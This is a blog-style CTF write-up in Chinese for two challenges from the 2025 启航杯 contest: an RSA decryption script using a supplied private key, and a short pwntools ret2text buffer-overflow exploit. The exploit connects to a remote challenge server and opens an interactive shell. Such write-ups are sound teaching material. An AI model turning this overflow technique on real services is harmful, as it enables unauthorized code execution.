      2025启航杯密码和pwn题目题解
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><strong>Easy_RSA</strong></p>
<span id="more"></span>

<p>使用私钥对应解密即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">from Crypto.Cipher import PKCS1_OAEP</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">private_key = b&#x27;-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQDe4fAh2si86Yl9aJ9ppZ96AhnKqriOr9SjKebYQk3S7tJbz468\nqhsGtWQYN180S1ndNaAVqNZbKgw/n8NcdqW59pAz1PThHGnF6PtH+uKiyazB5thw\nuCgeMEbp54ziM9cf27QGfk7+Lh9F/v8bmrBf4Iu/GT1PW6z0vKDkAk/pPQIDAQAB\nAoGAH8u7phjAFQh7721tex+AO2JGq6g54UvULzKwa/Q0MKiWpI0Hn9fkjcsdbGxP\nI0wHQIzV5EEh01Tm9RdQQhtAU52U4D6grofAY5y5kjJTahlDqdL1+VMHFsVdQxnB\n8F6WZdTrd5lx7Wn+DsmpiNLZqQBzt+EnnJF0a5qWpx9RXUECQQDgXmaq56/P2r6d\nDLB9xdjwOkx9i1+0pbX+FESlIPg6RgTe2lfPyo4UpjZ7SDg/N/jxNaCGO9hnKKxc\nW8Ki83t3AkEA/k3mVRtKL6xczmswgAaK/8UHtBOhV51NIXB6kio2e6UjJdnHFMX3\nSz+4aX4DJV6FeLMP1leKtrd5w13DdE3F6wJAIlFOEsXtNjWXAh52wEYKsHO6T1mK\nAe92rq4a8cbhMMiU5iEvXTD2GmJx4tlhAQpmoT46l02ABAdMlbPTSWlEcQJBAJCR\nppTRa85IVYY/p5XQomqfDy8PTdSqJzQQZo37k3edPKsC8Etd86UCt4q5SX6QCp7A\nZQt8Pu56xa0L+9Z9dDsCQHQCMI+d/fmrkwMGuWgxn67GcIJjz12TjulYwSv9y/Au\nZd7CmmxJuSFy8ZZSsE7tYwMwsyms5UOjA0T6EwUztzk=\n-----END RSA PRIVATE KEY-----&#x27;</span><br><span class="line">public_key = b&#x27;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDe4fAh2si86Yl9aJ9ppZ96AhnK\nqriOr9SjKebYQk3S7tJbz468qhsGtWQYN180S1ndNaAVqNZbKgw/n8NcdqW59pAz\n1PThHGnF6PtH+uKiyazB5thwuCgeMEbp54ziM9cf27QGfk7+Lh9F/v8bmrBf4Iu/\nGT1PW6z0vKDkAk/pPQIDAQAB\n-----END PUBLIC KEY-----&#x27;</span><br><span class="line"></span><br><span class="line">def decrypt_message(message, private_key):</span><br><span class="line">    message = base64.b64decode(message)</span><br><span class="line">    key = RSA.import_key(private_key)</span><br><span class="line">    cipher = PKCS1_OAEP.new(key)</span><br><span class="line">    decrypted_message = cipher.decrypt(message)</span><br><span class="line">    return decrypted_message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">message = &quot;:Nu+Yqe4DigDpJLag6U4BnflDz6lYnpzwn/58olMKsCtjHH4g1YV6n7wuQL/PK8HNAQM+/uHZpfTOG4FjpQmtFqiW7DkBotg8KmH9Cud2z6jwkCCkjanl1XB81LwCFiKp1IETiCNTOssMMyKSlJmnjHdsj8j4K4ylbNrl5yZuH3k=&quot;</span><br><span class="line">encrypted = decrypt_message(message, private_key)</span><br><span class="line">print(encrypted)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>Easy_PWN</strong></p>
<p>直接ret2text泄露后门即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&quot;154.64.245.108&quot;, 33444)</span><br><span class="line">payload = b&#x27;a&#x27; * 0x58 + p64(0x4011C7)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
